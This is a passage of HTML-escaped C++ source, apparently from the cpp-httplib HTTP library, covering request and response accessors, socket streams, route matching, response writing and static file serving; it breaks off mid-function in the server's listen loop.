inline void Request::set_header(const std::string &amp;key,
                                const std::string &amp;val) {
  if (detail::fields::is_field_name(key) &amp;&amp;
      detail::fields::is_field_value(val)) {
    headers.emplace(key, val);
  }
}

inline bool Request::has_param(const std::string &amp;key) const {
  return params.find(key) != params.end();
}

inline std::string Request::get_param_value(const std::string &amp;key,
                                            size_t id) const {
  auto rng = params.equal_range(key);
  auto it = rng.first;
  std::advance(it, static_cast&lt;ssize_t&gt;(id));
  if (it != rng.second) { return it-&gt;second; }
  return std::string();
}

inline size_t Request::get_param_value_count(const std::string &amp;key) const {
  auto r = params.equal_range(key);
  return static_cast&lt;size_t&gt;(std::distance(r.first, r.second));
}

inline bool Request::is_multipart_form_data() const {
  const auto &amp;content_type = get_header_value("Content-Type");
  return !content_type.rfind("multipart/form-data", 0);
}

inline bool Request::has_file(const std::string &amp;key) const {
  return files.find(key) != files.end();
}

inline MultipartFormData Request::get_file_value(const std::string &amp;key) const {
  auto it = files.find(key);
  if (it != files.end()) { return it-&gt;second; }
  return MultipartFormData();
}

inline std::vector&lt;MultipartFormData&gt;
Request::get_file_values(const std::string &amp;key) const {
  std::vector&lt;MultipartFormData&gt; values;
  auto rng = files.equal_range(key);
  for (auto it = rng.first; it != rng.second; it++) {
    values.push_back(it-&gt;second);
  }
  return values;
}

// Response implementation
inline bool Response::has_header(const std::string &amp;key) const {
  return headers.find(key) != headers.end();
}

inline std::string Response::get_header_value(const std::string &amp;key,
                                              const char *def,
                                              size_t id) const {
  return detail::get_header_value(headers, key, def, id);
}

inline size_t Response::get_header_value_count(const std::string &amp;key) const {
  auto r = headers.equal_range(key);
  return static_cast&lt;size_t&gt;(std::distance(r.first, r.second));
}

inline void Response::set_header(const std::string &amp;key,
                                 const std::string &amp;val) {
  if (detail::fields::is_field_name(key) &amp;&amp;
      detail::fields::is_field_value(val)) {
    headers.emplace(key, val);
  }
}

inline void Response::set_redirect(const std::string &amp;url, int stat) {
  if (detail::fields::is_field_value(url)) {
    set_header("Location", url);
    if (300 &lt;= stat &amp;&amp; stat &lt; 400) {
      this-&gt;status = stat;
    } else {
      this-&gt;status = StatusCode::Found_302;
    }
  }
}

inline void Response::set_content(const char *s, size_t n,
                                  const std::string &amp;content_type) {
  body.assign(s, n);

  auto rng = headers.equal_range("Content-Type");
  headers.erase(rng.first, rng.second);
  set_header("Content-Type", content_type);
}

inline void Response::set_content(const std::string &amp;s,
                                  const std::string &amp;content_type) {
  set_content(s.data(), s.size(), content_type);
}

inline void Response::set_content(std::string &amp;&amp;s,
                                  const std::string &amp;content_type) {
  body = std::move(s);

  auto rng = headers.equal_range("Content-Type");
  headers.erase(rng.first, rng.second);
  set_header("Content-Type", content_type);
}

inline void Response::set_content_provider(
    size_t in_length, const std::string &amp;content_type, ContentProvider provider,
    ContentProviderResourceReleaser resource_releaser) {
  set_header("Content-Type", content_type);
  content_length_ = in_length;
  if (in_length &gt; 0) { content_provider_ = std::move(provider); }
  content_provider_resource_releaser_ = std::move(resource_releaser);
  is_chunked_content_provider_ = false;
}

inline void Response::set_content_provider(
    const std::string &amp;content_type, ContentProviderWithoutLength provider,
    ContentProviderResourceReleaser resource_releaser) {
  set_header("Content-Type", content_type);
  content_length_ = 0;
  content_provider_ = detail::ContentProviderAdapter(std::move(provider));
  content_provider_resource_releaser_ = std::move(resource_releaser);
  is_chunked_content_provider_ = false;
}

inline void Response::set_chunked_content_provider(
    const std::string &amp;content_type, ContentProviderWithoutLength provider,
    ContentProviderResourceReleaser resource_releaser) {
  set_header("Content-Type", content_type);
  content_length_ = 0;
  content_provider_ = detail::ContentProviderAdapter(std::move(provider));
  content_provider_resource_releaser_ = std::move(resource_releaser);
  is_chunked_content_provider_ = true;
}

inline void Response::set_file_content(const std::string &amp;path,
                                       const std::string &amp;content_type) {
  file_content_path_ = path;
  file_content_content_type_ = content_type;
}

inline void Response::set_file_content(const std::string &amp;path) {
  file_content_path_ = path;
}

// Result implementation
inline bool Result::has_request_header(const std::string &amp;key) const {
  return request_headers_.find(key) != request_headers_.end();
}

inline std::string Result::get_request_header_value(const std::string &amp;key,
                                                    const char *def,
                                                    size_t id) const {
  return detail::get_header_value(request_headers_, key, def, id);
}

inline size_t
Result::get_request_header_value_count(const std::string &amp;key) const {
  auto r = request_headers_.equal_range(key);
  return static_cast&lt;size_t&gt;(std::distance(r.first, r.second));
}

// Stream implementation
inline ssize_t Stream::write(const char *ptr) {
  return write(ptr, strlen(ptr));
}

inline ssize_t Stream::write(const std::string &amp;s) {
  return write(s.data(), s.size());
}

namespace detail {

inline void calc_actual_timeout(time_t max_timeout_msec,
                                time_t duration_msec, time_t timeout_sec,
                                time_t timeout_usec, time_t &amp;actual_timeout_sec,
                                time_t &amp;actual_timeout_usec) {
  auto timeout_msec = (timeout_sec * 1000) + (timeout_usec / 1000);

  auto actual_timeout_msec =
      (std::min)(max_timeout_msec - duration_msec, timeout_msec);

  actual_timeout_sec = actual_timeout_msec / 1000;
  actual_timeout_usec = (actual_timeout_msec % 1000) * 1000;
}

// Socket stream implementation
inline SocketStream::SocketStream(
    socket_t sock, time_t read_timeout_sec, time_t read_timeout_usec,
    time_t write_timeout_sec, time_t write_timeout_usec,
    time_t max_timeout_msec,
    std::chrono::time_point&lt;std::chrono::steady_clock&gt; start_time)
    : sock_(sock), read_timeout_sec_(read_timeout_sec),
      read_timeout_usec_(read_timeout_usec),
      write_timeout_sec_(write_timeout_sec),
      write_timeout_usec_(write_timeout_usec),
      max_timeout_msec_(max_timeout_msec), start_time(start_time),
      read_buff_(read_buff_size_, 0) {}

inline SocketStream::~SocketStream() = default;

inline bool SocketStream::is_readable() const {
  if (max_timeout_msec_ &lt;= 0) {
    return select_read(sock_, read_timeout_sec_, read_timeout_usec_) &gt; 0;
  }

  time_t read_timeout_sec;
  time_t read_timeout_usec;
  calc_actual_timeout(max_timeout_msec_, duration(), read_timeout_sec_,
                      read_timeout_usec_, read_timeout_sec, read_timeout_usec);

  return select_read(sock_, read_timeout_sec, read_timeout_usec) &gt; 0;
}

inline bool SocketStream::is_writable() const {
  return select_write(sock_, write_timeout_sec_, write_timeout_usec_) &gt; 0 &amp;&amp;
         is_socket_alive(sock_);
}

inline ssize_t SocketStream::read(char *ptr, size_t size) {
#ifdef _WIN32
  size =
      (std::min)(size, static_cast&lt;size_t&gt;((std::numeric_limits&lt;int&gt;::max)()));
#else
  size = (std::min)(size,
                    static_cast&lt;size_t&gt;((std::numeric_limits&lt;ssize_t&gt;::max)()));
#endif

  if (read_buff_off_ &lt; read_buff_content_size_) {
    auto remaining_size = read_buff_content_size_ - read_buff_off_;
    if (size &lt;= remaining_size) {
      memcpy(ptr, read_buff_.data() + read_buff_off_, size);
      read_buff_off_ += size;
      return static_cast&lt;ssize_t&gt;(size);
    } else {
      memcpy(ptr, read_buff_.data() + read_buff_off_, remaining_size);
      read_buff_off_ += remaining_size;
      return static_cast&lt;ssize_t&gt;(remaining_size);
    }
  }

  if (!is_readable()) { return -1; }

  read_buff_off_ = 0;
  read_buff_content_size_ = 0;

  if (size &lt; read_buff_size_) {
    auto n = read_socket(sock_, read_buff_.data(), read_buff_size_,
                         CPPHTTPLIB_RECV_FLAGS);
    if (n &lt;= 0) {
      return n;
    } else if (n &lt;= static_cast&lt;ssize_t&gt;(size)) {
      memcpy(ptr, read_buff_.data(), static_cast&lt;size_t&gt;(n));
      return n;
    } else {
      memcpy(ptr, read_buff_.data(), size);
      read_buff_off_ = size;
      read_buff_content_size_ = static_cast&lt;size_t&gt;(n);
      return static_cast&lt;ssize_t&gt;(size);
    }
  } else {
    return read_socket(sock_, ptr, size, CPPHTTPLIB_RECV_FLAGS);
  }
}

inline ssize_t SocketStream::write(const char *ptr, size_t size) {
  if (!is_writable()) { return -1; }

#if defined(_WIN32) &amp;&amp; !defined(_WIN64)
  size =
      (std::min)(size, static_cast&lt;size_t&gt;((std::numeric_limits&lt;int&gt;::max)()));
#endif

  return send_socket(sock_, ptr, size, CPPHTTPLIB_SEND_FLAGS);
}

inline void SocketStream::get_remote_ip_and_port(std::string &amp;ip,
                                                 int &amp;port) const {
  return detail::get_remote_ip_and_port(sock_, ip, port);
}

inline void SocketStream::get_local_ip_and_port(std::string &amp;ip,
                                                int &amp;port) const {
  return detail::get_local_ip_and_port(sock_, ip, port);
}

inline socket_t SocketStream::socket() const { return sock_; }

inline time_t SocketStream::duration() const {
  return std::chrono::duration_cast&lt;std::chrono::milliseconds&gt;(
             std::chrono::steady_clock::now() - start_time)
      .count();
}

// Buffer stream implementation
inline bool BufferStream::is_readable() const { return true; }

inline bool BufferStream::is_writable() const { return true; }

inline ssize_t BufferStream::read(char *ptr, size_t size) {
#if defined(_MSC_VER) &amp;&amp; _MSC_VER &lt; 1910
  auto len_read = buffer._Copy_s(ptr, size, size, position);
#else
  auto len_read = buffer.copy(ptr, size, position);
#endif
  position += static_cast&lt;size_t&gt;(len_read);
  return static_cast&lt;ssize_t&gt;(len_read);
}

inline ssize_t BufferStream::write(const char *ptr, size_t size) {
  buffer.append(ptr, size);
  return static_cast&lt;ssize_t&gt;(size);
}

inline void BufferStream::get_remote_ip_and_port(std::string &amp; /*ip*/,
                                                 int &amp; /*port*/) const {}

inline void BufferStream::get_local_ip_and_port(std::string &amp; /*ip*/,
                                                int &amp; /*port*/) const {}

inline socket_t BufferStream::socket() const { return 0; }

inline time_t BufferStream::duration() const { return 0; }

inline const std::string &amp;BufferStream::get_buffer() const { return buffer; }

inline PathParamsMatcher::PathParamsMatcher(const std::string &amp;pattern) {
  static constexpr char marker[] = "/:";

  // One past the last ending position of a path param substring
  std::size_t last_param_end = 0;

#ifndef CPPHTTPLIB_NO_EXCEPTIONS
  // Needed to ensure that parameter names are unique during matcher
  // construction
  // If exceptions are disabled, only last duplicate path
  // parameter will be set
  std::unordered_set&lt;std::string&gt; param_name_set;
#endif

  while (true) {
    const auto marker_pos = pattern.find(
        marker, last_param_end == 0 ? last_param_end : last_param_end - 1);
    if (marker_pos == std::string::npos) { break; }

    static_fragments_.push_back(
        pattern.substr(last_param_end, marker_pos - last_param_end + 1));

    const auto param_name_start = marker_pos + 2;

    auto sep_pos = pattern.find(separator, param_name_start);
    if (sep_pos == std::string::npos) { sep_pos = pattern.length(); }

    auto param_name =
        pattern.substr(param_name_start, sep_pos - param_name_start);

#ifndef CPPHTTPLIB_NO_EXCEPTIONS
    if (param_name_set.find(param_name) != param_name_set.cend()) {
      std::string msg = "Encountered path parameter '" + param_name +
                        "' multiple times in route pattern '" + pattern + "'.";
      throw std::invalid_argument(msg);
    }
#endif

    param_names_.push_back(std::move(param_name));

    last_param_end = sep_pos + 1;
  }

  if (last_param_end &lt; pattern.length()) {
    static_fragments_.push_back(pattern.substr(last_param_end));
  }
}

inline bool PathParamsMatcher::match(Request &amp;request) const {
  request.matches = std::smatch();
  request.path_params.clear();
  request.path_params.reserve(param_names_.size());

  // One past the position at which the path matched the pattern last time
  std::size_t starting_pos = 0;
  for (size_t i = 0; i &lt; static_fragments_.size(); ++i) {
    const auto &amp;fragment = static_fragments_[i];

    if (starting_pos + fragment.length() &gt; request.path.length()) {
      return false;
    }

    // Avoid unnecessary allocation by using strncmp instead of substr +
    // comparison
    if (std::strncmp(request.path.c_str() + starting_pos, fragment.c_str(),
                     fragment.length()) != 0) {
      return false;
    }

    starting_pos += fragment.length();

    // Should only happen when we have a static fragment after a param
    // Example: '/users/:id/subscriptions'
    // The 'subscriptions' fragment here does not have a corresponding param
    if (i &gt;= param_names_.size()) { continue; }

    auto sep_pos = request.path.find(separator, starting_pos);
    if (sep_pos == std::string::npos) { sep_pos = request.path.length(); }

    const auto &amp;param_name = param_names_[i];

    request.path_params.emplace(
        param_name, request.path.substr(starting_pos, sep_pos - starting_pos));

    // Mark everything up to '/' as matched
    starting_pos = sep_pos + 1;
  }
  // Returns false if the path is longer than the pattern
  return starting_pos &gt;= request.path.length();
}

inline bool RegexMatcher::match(Request &amp;request) const {
  request.path_params.clear();
  return std::regex_match(request.path, request.matches, regex_);
}

} // namespace detail

// HTTP server implementation
inline Server::Server()
    : new_task_queue(
          [] { return new ThreadPool(CPPHTTPLIB_THREAD_POOL_COUNT); }) {
#ifndef _WIN32
  signal(SIGPIPE, SIG_IGN);
#endif
}

inline Server::~Server() = default;

inline std::unique_ptr&lt;detail::MatcherBase&gt;
Server::make_matcher(const std::string &amp;pattern) {
  if (pattern.find("/:") != std::string::npos) {
    return detail::make_unique&lt;detail::PathParamsMatcher&gt;(pattern);
  } else {
    return detail::make_unique&lt;detail::RegexMatcher&gt;(pattern);
  }
}

inline Server &amp;Server::Get(const std::string &amp;pattern, Handler handler) {
  get_handlers_.emplace_back(make_matcher(pattern), std::move(handler));
  return *this;
}

inline Server &amp;Server::Post(const std::string &amp;pattern, Handler handler) {
  post_handlers_.emplace_back(make_matcher(pattern), std::move(handler));
  return *this;
}

inline Server &amp;Server::Post(const std::string &amp;pattern,
                            HandlerWithContentReader handler) {
  post_handlers_for_content_reader_.emplace_back(make_matcher(pattern),
                                                 std::move(handler));
  return *this;
}

inline Server &amp;Server::Put(const std::string &amp;pattern, Handler handler) {
  put_handlers_.emplace_back(make_matcher(pattern), std::move(handler));
  return *this;
}

inline Server &amp;Server::Put(const std::string &amp;pattern,
                           HandlerWithContentReader handler) {
  put_handlers_for_content_reader_.emplace_back(make_matcher(pattern),
                                                std::move(handler));
  return *this;
}

inline Server &amp;Server::Patch(const std::string &amp;pattern, Handler handler) {
  patch_handlers_.emplace_back(make_matcher(pattern), std::move(handler));
  return *this;
}

inline Server &amp;Server::Patch(const std::string &amp;pattern,
                             HandlerWithContentReader handler) {
  patch_handlers_for_content_reader_.emplace_back(make_matcher(pattern),
                                                  std::move(handler));
  return *this;
}

inline Server &amp;Server::Delete(const std::string &amp;pattern, Handler handler) {
  delete_handlers_.emplace_back(make_matcher(pattern), std::move(handler));
  return *this;
}

inline Server &amp;Server::Delete(const std::string &amp;pattern,
                              HandlerWithContentReader handler) {
  delete_handlers_for_content_reader_.emplace_back(make_matcher(pattern),
                                                   std::move(handler));
  return *this;
}

inline Server &amp;Server::Options(const std::string &amp;pattern, Handler handler) {
  options_handlers_.emplace_back(make_matcher(pattern), std::move(handler));
  return *this;
}

inline bool Server::set_base_dir(const std::string &amp;dir,
                                 const std::string &amp;mount_point) {
  return set_mount_point(mount_point, dir);
}

inline bool Server::set_mount_point(const std::string &amp;mount_point,
                                    const std::string &amp;dir, Headers headers) {
  detail::FileStat stat(dir);
  if (stat.is_dir()) {
    std::string mnt = !mount_point.empty() ? mount_point : "/";
    if (!mnt.empty() &amp;&amp; mnt[0] == '/') {
      base_dirs_.push_back({mnt, dir, std::move(headers)});
      return true;
    }
  }
  return false;
}

inline bool Server::remove_mount_point(const std::string &amp;mount_point) {
  for (auto it = base_dirs_.begin(); it != base_dirs_.end(); ++it) {
    if (it-&gt;mount_point == mount_point) {
      base_dirs_.erase(it);
      return true;
    }
  }
  return false;
}

inline Server &amp;
Server::set_file_extension_and_mimetype_mapping(const std::string &amp;ext,
                                                const std::string &amp;mime) {
  file_extension_and_mimetype_map_[ext] = mime;
  return *this;
}

inline Server &amp;Server::set_default_file_mimetype(const std::string &amp;mime) {
  default_file_mimetype_ = mime;
  return *this;
}

inline Server &amp;Server::set_file_request_handler(Handler handler) {
  file_request_handler_ = std::move(handler);
  return *this;
}

inline Server &amp;Server::set_error_handler_core(HandlerWithResponse handler,
                                              std::true_type) {
  error_handler_ = std::move(handler);
  return *this;
}

inline Server &amp;Server::set_error_handler_core(Handler handler,
                                              std::false_type) {
  error_handler_ = [handler](const Request &amp;req, Response &amp;res) {
    handler(req, res);
    return HandlerResponse::Handled;
  };
  return *this;
}

inline Server &amp;Server::set_exception_handler(ExceptionHandler handler) {
  exception_handler_ = std::move(handler);
  return *this;
}

inline Server &amp;Server::set_pre_routing_handler(HandlerWithResponse handler) {
  pre_routing_handler_ = std::move(handler);
  return *this;
}

inline Server &amp;Server::set_post_routing_handler(Handler handler) {
  post_routing_handler_ = std::move(handler);
  return *this;
}

inline Server &amp;Server::set_logger(Logger logger) {
  logger_ = std::move(logger);
  return *this;
}

inline Server &amp;
Server::set_expect_100_continue_handler(Expect100ContinueHandler handler) {
  expect_100_continue_handler_ = std::move(handler);
  return *this;
}

inline Server &amp;Server::set_address_family(int family) {
  address_family_ = family;
  return *this;
}

inline Server &amp;Server::set_tcp_nodelay(bool on) {
  tcp_nodelay_ = on;
  return *this;
}

inline Server &amp;Server::set_ipv6_v6only(bool on) {
  ipv6_v6only_ = on;
  return *this;
}

inline Server &amp;Server::set_socket_options(SocketOptions socket_options) {
  socket_options_ = std::move(socket_options);
  return *this;
}

inline Server &amp;Server::set_default_headers(Headers headers) {
  default_headers_ = std::move(headers);
  return *this;
}

inline Server &amp;Server::set_header_writer(
    std::function&lt;ssize_t(Stream &amp;, Headers &amp;)&gt; const &amp;writer) {
  header_writer_ = writer;
  return *this;
}

inline Server &amp;Server::set_keep_alive_max_count(size_t count) {
  keep_alive_max_count_ = count;
  return *this;
}

inline Server &amp;Server::set_keep_alive_timeout(time_t sec) {
  keep_alive_timeout_sec_ = sec;
  return *this;
}

inline Server &amp;Server::set_read_timeout(time_t sec, time_t usec) {
  read_timeout_sec_ = sec;
  read_timeout_usec_ = usec;
  return *this;
}

inline Server &amp;Server::set_write_timeout(time_t sec, time_t usec) {
  write_timeout_sec_ = sec;
  write_timeout_usec_ = usec;
  return *this;
}

inline Server &amp;Server::set_idle_interval(time_t sec, time_t usec) {
  idle_interval_sec_ = sec;
  idle_interval_usec_ = usec;
  return *this;
}

inline Server &amp;Server::set_payload_max_length(size_t length) {
  payload_max_length_ = length;
  return *this;
}

inline bool Server::bind_to_port(const std::string &amp;host, int port,
                                 int socket_flags) {
  auto ret = bind_internal(host, port, socket_flags);
  if (ret == -1) { is_decommisioned = true; }
  return ret &gt;= 0;
}
inline int Server::bind_to_any_port(const std::string &amp;host, int socket_flags) {
  auto ret = bind_internal(host, 0, socket_flags);
  if (ret == -1) { is_decommisioned = true; }
  return ret;
}

inline bool Server::listen_after_bind() { return listen_internal(); }

inline bool Server::listen(const std::string &amp;host, int port,
                           int socket_flags) {
  return bind_to_port(host, port, socket_flags) &amp;&amp; listen_internal();
}

inline bool Server::is_running() const { return is_running_; }

inline void Server::wait_until_ready() const {
  while (!is_running_ &amp;&amp; !is_decommisioned) {
    std::this_thread::sleep_for(std::chrono::milliseconds{1});
  }
}

inline void Server::stop() {
  if (is_running_) {
    assert(svr_sock_ != INVALID_SOCKET);
    std::atomic&lt;socket_t&gt; sock(svr_sock_.exchange(INVALID_SOCKET));
    detail::shutdown_socket(sock);
    detail::close_socket(sock);
  }
  is_decommisioned = false;
}

inline void Server::decommission() { is_decommisioned = true; }

inline bool Server::parse_request_line(const char *s, Request &amp;req) const {
  auto len = strlen(s);
  if (len &lt; 2 || s[len - 2] != '\r' || s[len - 1] != '\n') { return false; }
  len -= 2;

  {
    size_t count = 0;

    detail::split(s, s + len, ' ', [&amp;](const char *b, const char *e) {
      switch (count) {
      case 0: req.method = std::string(b, e); break;
      case 1: req.target = std::string(b, e); break;
      case 2: req.version = std::string(b, e); break;
      default: break;
      }
      count++;
    });

    if (count != 3) { return false; }
  }

  static const std::set&lt;std::string&gt; methods{
      "GET",     "HEAD",    "POST",  "PUT",   "DELETE",
      "CONNECT", "OPTIONS", "TRACE", "PATCH", "PRI"};

  if (methods.find(req.method) == methods.end()) { return false; }

  if (req.version != "HTTP/1.1" &amp;&amp; req.version != "HTTP/1.0") { return false; }

  {
    // Skip URL fragment
    for (size_t i = 0; i &lt; req.target.size(); i++) {
      if (req.target[i] == '#') {
        req.target.erase(i);
        break;
      }
    }

    detail::divide(req.target, '?',
                   [&amp;](const char *lhs_data, std::size_t lhs_size,
                       const char *rhs_data, std::size_t rhs_size) {
                     req.path = detail::decode_url(
                         std::string(lhs_data, lhs_size), false);
                     detail::parse_query_text(rhs_data, rhs_size, req.params);
                   });
  }

  return true;
}

inline bool Server::write_response(Stream &amp;strm, bool close_connection,
                                   Request &amp;req, Response &amp;res) {
  // NOTE: `req.ranges` should be empty, otherwise it will be applied
  // incorrectly to the error content.
  req.ranges.clear();
  return write_response_core(strm, close_connection, req, res, false);
}

inline bool Server::write_response_with_content(Stream &amp;strm,
                                                bool close_connection,
                                                const Request &amp;req,
                                                Response &amp;res) {
  return write_response_core(strm, close_connection, req, res, true);
}

inline bool Server::write_response_core(Stream &amp;strm, bool close_connection,
                                        const Request &amp;req, Response &amp;res,
                                        bool need_apply_ranges) {
  assert(res.status != -1);

  if (400 &lt;= res.status &amp;&amp; error_handler_ &amp;&amp;
      error_handler_(req, res) == HandlerResponse::Handled) {
    need_apply_ranges = true;
  }

  std::string content_type;
  std::string boundary;
  if (need_apply_ranges) { apply_ranges(req, res, content_type, boundary); }

  // Prepare additional headers
  if (close_connection || req.get_header_value("Connection") == "close") {
    res.set_header("Connection", "close");
  } else {
    std::string s = "timeout=";
    s += std::to_string(keep_alive_timeout_sec_);
    s += ", max=";
    s += std::to_string(keep_alive_max_count_);
    res.set_header("Keep-Alive", s);
  }

  if ((!res.body.empty() || res.content_length_ &gt; 0 || res.content_provider_) &amp;&amp;
      !res.has_header("Content-Type")) {
    res.set_header("Content-Type", "text/plain");
  }

  if (res.body.empty() &amp;&amp; !res.content_length_ &amp;&amp; !res.content_provider_ &amp;&amp;
      !res.has_header("Content-Length")) {
    res.set_header("Content-Length", "0");
  }

  if (req.method == "HEAD" &amp;&amp; !res.has_header("Accept-Ranges")) {
    res.set_header("Accept-Ranges", "bytes");
  }

  if (post_routing_handler_) { post_routing_handler_(req, res); }

  // Response line and headers
  {
    detail::BufferStream bstrm;
    if (!detail::write_response_line(bstrm, res.status)) { return false; }
    if (!header_writer_(bstrm, res.headers)) { return false; }

    // Flush buffer
    auto &amp;data = bstrm.get_buffer();
    detail::write_data(strm, data.data(), data.size());
  }

  // Body
  auto ret = true;
  if (req.method != "HEAD") {
    if (!res.body.empty()) {
      if (!detail::write_data(strm, res.body.data(), res.body.size())) {
        ret = false;
      }
    } else if (res.content_provider_) {
      if (write_content_with_provider(strm, req, res, boundary, content_type)) {
        res.content_provider_success_ = true;
      } else {
        ret = false;
      }
    }
  }

  // Log
  if (logger_) { logger_(req, res); }

  return ret;
}

inline bool
Server::write_content_with_provider(Stream &amp;strm, const Request &amp;req,
                                    Response &amp;res, const std::string &amp;boundary,
                                    const std::string &amp;content_type) {
  auto is_shutting_down = [this]() {
    return this-&gt;svr_sock_ == INVALID_SOCKET;
  };

  if (res.content_length_ &gt; 0) {
    if (req.ranges.empty()) {
      return detail::write_content(strm, res.content_provider_, 0,
                                   res.content_length_, is_shutting_down);
    } else if (req.ranges.size() == 1) {
      auto offset_and_length = detail::get_range_offset_and_length(
          req.ranges[0], res.content_length_);

      return detail::write_content(strm, res.content_provider_,
                                   offset_and_length.first,
                                   offset_and_length.second, is_shutting_down);
    } else {
      return detail::write_multipart_ranges_data(
          strm, req, res, boundary, content_type, res.content_length_,
          is_shutting_down);
    }
  } else {
    if (res.is_chunked_content_provider_) {
      auto type = detail::encoding_type(req, res);

      std::unique_ptr&lt;detail::compressor&gt; compressor;
      if (type == detail::EncodingType::Gzip) {
#ifdef CPPHTTPLIB_ZLIB_SUPPORT
        compressor = detail::make_unique&lt;detail::gzip_compressor&gt;();
#endif
      } else if (type == detail::EncodingType::Brotli) {
#ifdef CPPHTTPLIB_BROTLI_SUPPORT
        compressor = detail::make_unique&lt;detail::brotli_compressor&gt;();
#endif
      } else {
        compressor = detail::make_unique&lt;detail::nocompressor&gt;();
      }
      assert(compressor != nullptr);

      return detail::write_content_chunked(strm, res.content_provider_,
                                           is_shutting_down, *compressor);
    } else {
      return detail::write_content_without_length(strm, res.content_provider_,
                                                  is_shutting_down);
    }
  }
}

inline bool Server::read_content(Stream &amp;strm, Request &amp;req, Response &amp;res) {
  MultipartFormDataMap::iterator cur;
  auto file_count = 0;
  if (read_content_core(
          strm, req, res,
          // Regular
          [&amp;](const char *buf, size_t n) {
            if (req.body.size() + n &gt; req.body.max_size()) { return false; }
            req.body.append(buf, n);
            return true;
          },
          // Multipart
          [&amp;](const MultipartFormData &amp;file) {
            if (file_count++ == CPPHTTPLIB_MULTIPART_FORM_DATA_FILE_MAX_COUNT) {
              return false;
            }
            cur = req.files.emplace(file.name, file);
            return true;
          },
          [&amp;](const char *buf, size_t n) {
            auto &amp;content = cur-&gt;second.content;
            if (content.size() + n &gt; content.max_size()) { return false; }
            content.append(buf, n);
            return true;
          })) {
    const auto &amp;content_type = req.get_header_value("Content-Type");
    if (!content_type.find("application/x-www-form-urlencoded")) {
      if (req.body.size() &gt; CPPHTTPLIB_FORM_URL_ENCODED_PAYLOAD_MAX_LENGTH) {
        res.status = StatusCode::PayloadTooLarge_413; // NOTE: should be 414?
        return false;
      }
      detail::parse_query_text(req.body, req.params);
    }
    return true;
  }
  return false;
}

inline bool Server::read_content_with_content_receiver(
    Stream &amp;strm, Request &amp;req, Response &amp;res, ContentReceiver receiver,
    MultipartContentHeader multipart_header,
    ContentReceiver multipart_receiver) {
  return read_content_core(strm, req, res, std::move(receiver),
                           std::move(multipart_header),
                           std::move(multipart_receiver));
}

inline bool
Server::read_content_core(Stream &amp;strm, Request &amp;req, Response &amp;res,
                          ContentReceiver receiver,
                          MultipartContentHeader multipart_header,
                          ContentReceiver multipart_receiver) const {
  detail::MultipartFormDataParser multipart_form_data_parser;
  ContentReceiverWithProgress out;

  if (req.is_multipart_form_data()) {
    const auto &amp;content_type = req.get_header_value("Content-Type");
    std::string boundary;
    if (!detail::parse_multipart_boundary(content_type, boundary)) {
      res.status = StatusCode::BadRequest_400;
      return false;
    }

    multipart_form_data_parser.set_boundary(std::move(boundary));
    out = [&amp;](const char *buf, size_t n, uint64_t /*off*/, uint64_t /*len*/) {
      /* For debug
      size_t pos = 0;
      while (pos &lt; n) {
        auto read_size = (std::min)&lt;size_t&gt;(1, n - pos);
        auto ret = multipart_form_data_parser.parse(
            buf + pos, read_size, multipart_receiver, multipart_header);
        if (!ret) { return false; }
        pos += read_size;
      }
      return true;
      */
      return multipart_form_data_parser.parse(buf, n, multipart_receiver,
                                              multipart_header);
    };
  } else {
    out = [receiver](const char *buf, size_t n, uint64_t /*off*/,
                     uint64_t /*len*/) { return receiver(buf, n); };
  }

  if (req.method == "DELETE" &amp;&amp; !req.has_header("Content-Length")) {
    return true;
  }

  if (!detail::read_content(strm, req, payload_max_length_, res.status, nullptr,
                            out, true)) {
    return false;
  }

  if (req.is_multipart_form_data()) {
    if (!multipart_form_data_parser.is_valid()) {
      res.status = StatusCode::BadRequest_400;
      return false;
    }
  }

  return true;
}

inline bool Server::handle_file_request(const Request &amp;req, Response &amp;res,
                                        bool head) {
  for (const auto &amp;entry : base_dirs_) {
    // Prefix match
    if (!req.path.compare(0, entry.mount_point.size(), entry.mount_point)) {
      std::string sub_path = "/" + req.path.substr(entry.mount_point.size());
      if (detail::is_valid_path(sub_path)) {
        auto path = entry.base_dir + sub_path;
        if (path.back() == '/') { path += "index.html"; }

        detail::FileStat stat(path);

        if (stat.is_dir()) {
          res.set_redirect(sub_path + "/", StatusCode::MovedPermanently_301);
          return true;
        }

        if (stat.is_file()) {
          for (const auto &amp;kv : entry.headers) {
            res.set_header(kv.first, kv.second);
          }

          auto mm = std::make_shared&lt;detail::mmap&gt;(path.c_str());
          if (!mm-&gt;is_open()) { return false; }

          res.set_content_provider(
              mm-&gt;size(),
              detail::find_content_type(path, file_extension_and_mimetype_map_,
                                        default_file_mimetype_),
              [mm](size_t offset, size_t length, DataSink &amp;sink) -&gt; bool {
                sink.write(mm-&gt;data() + offset, length);
                return true;
              });

          if (!head &amp;&amp; file_request_handler_) {
            file_request_handler_(req, res);
          }

          return true;
        }
      }
    }
  }
  return false;
}

inline socket_t
Server::create_server_socket(const std::string &amp;host, int port,
                             int socket_flags,
                             SocketOptions socket_options) const {
  return detail::create_socket(
      host, std::string(), port, address_family_, socket_flags, tcp_nodelay_,
      ipv6_v6only_, std::move(socket_options),
      [](socket_t sock, struct addrinfo &amp;ai, bool &amp; /*quit*/) -&gt; bool {
        if (::bind(sock, ai.ai_addr, static_cast&lt;socklen_t&gt;(ai.ai_addrlen))) {
          return false;
        }
        if (::listen(sock, CPPHTTPLIB_LISTEN_BACKLOG)) { return false; }
        return true;
      });
}

inline int Server::bind_internal(const std::string &amp;host, int port,
                                 int socket_flags) {
  if (is_decommisioned) { return -1; }

  if (!is_valid()) { return -1; }

  svr_sock_ = create_server_socket(host, port, socket_flags, socket_options_);
  if (svr_sock_ == INVALID_SOCKET) { return -1; }

  if (port == 0) {
    struct sockaddr_storage addr;
    socklen_t addr_len = sizeof(addr);
    if (getsockname(svr_sock_, reinterpret_cast&lt;struct sockaddr *&gt;(&amp;addr),
                    &amp;addr_len) == -1) {
      return -1;
    }
    if (addr.ss_family == AF_INET) {
      return ntohs(reinterpret_cast&lt;struct sockaddr_in *&gt;(&amp;addr)-&gt;sin_port);
    } else if (addr.ss_family == AF_INET6) {
      return ntohs(reinterpret_cast&lt;struct sockaddr_in6 *&gt;(&amp;addr)-&gt;sin6_port);
    } else {
      return -1;
    }
  } else {
    return port;
  }
}

inline bool Server::listen_internal() {
  if (is_decommisioned) { return false; }

  auto ret = true;
  is_running_ = true;
  auto se = detail::scope_exit([&amp;]() { is_running_ = false; });

  {
    std::unique_ptr&lt;TaskQueue&gt; task_queue(new_task_queue());

    while (svr_sock_ != INVALID_SOCKET) {
#ifndef _WIN32
      if (idle_interval_sec_ &gt; 0 || idle_interval_usec_ &gt; 0) {
#endif
